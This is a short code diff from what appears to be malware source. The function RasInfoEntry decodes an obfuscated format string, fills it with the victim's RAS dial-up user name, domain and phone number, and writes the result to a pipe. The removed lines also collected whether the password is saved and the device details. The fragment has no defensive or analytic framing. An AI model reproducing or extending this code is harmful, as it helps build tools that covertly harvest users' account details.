@@ -48,9 +48,7 @@ BOOL RasInfoEntry(HANDLE hPipe, LPSTR lpRasEntryName){
 	}
 
 	sprintf(msg, ds.getDecodeString((LPSTR)encStr_Username_Domain_PhoneNumber_Etc),
-		lpRasDialParams->szUserName, lpRasDialParams->szDomain, lpRasEntry->szLocalPhoneNumber,
-		PasswordSave ? "Yes": "No", 
-		lpRasEntry->szDeviceName, lpRasEntry->szDeviceType);
+		lpRasDialParams->szUserName, lpRasDialParams->szDomain, lpRasEntry->szLocalPhoneNumber);
 
 	WriteToPipe(hPipe, strlen(msg), msg, NULL);
 
